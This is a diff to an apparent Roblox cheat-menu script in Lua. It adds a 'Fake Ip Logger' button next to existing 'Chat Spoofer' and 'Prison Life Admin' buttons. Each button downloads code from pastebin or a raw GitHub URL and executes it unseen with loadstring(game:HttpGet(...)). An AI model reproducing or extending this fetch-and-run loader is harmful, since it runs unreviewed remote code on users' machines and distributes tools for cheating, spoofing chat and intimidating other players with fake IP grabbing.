@@ -35,6 +35,9 @@ end)
 Section:NewButton("Chat Spoofer", "Fake chat", function()
 loadstring(game:HttpGet('https://pastebin.com/raw/MBpnp3yS'))()
 end)
+Section:NewButton("Fake Ip Logger", "Fake Ip logger", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Yeeeter30/fake-ip-grabber/main/Fake%20ip%20grabber'))();
+end)
 local Section = Tab:NewSection("Prison Life")
 Section:NewButton("Prison Life Admin", "Admin", function()
 loadstring(game:HttpGet('https://pastebin.com/raw/iZ64yzjE'))();
